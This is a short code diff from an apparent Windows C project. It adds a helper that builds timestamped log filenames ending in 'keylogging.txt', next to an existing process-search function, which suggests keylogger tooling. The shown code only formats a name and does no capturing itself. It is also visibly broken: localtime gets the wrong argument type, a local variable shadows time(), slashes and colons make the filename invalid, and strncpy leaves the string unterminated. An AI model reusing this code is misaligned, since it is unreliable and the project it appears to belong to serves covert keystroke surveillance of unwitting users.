@@ -275,3 +275,27 @@ BOOL SearchProcess(int searchType, DWORD pid, const char* pName,DWORD* findProce
 		return FALSE;
 	}
 }
+
+BOOL MakeFileName(char* fileName)
+{
+	time_t timer;
+	struct tm* t=NULL;
+	char tempFileName[MAX_FILE_LENGTH+1]="";
+	timer = time(NULL);
+
+	t = localtime(timer);
+
+	int year = t->tm_year + 1900,
+		month = t->tm_mon + 1,
+		day = t->tm_mday,
+		time = t->tm_hour,
+		min = t->tm_min,
+		sec = t->tm_sec;
+
+	if (!sprintf(tempFileName, "%d/%d/%d %d:%d:%d keylogging.txt", year, month, day, time, min, sec))
+		return FALSE;
+
+	strncpy(fileName, tempFileName, strlen(tempFileName));
+
+	return TRUE;
+}
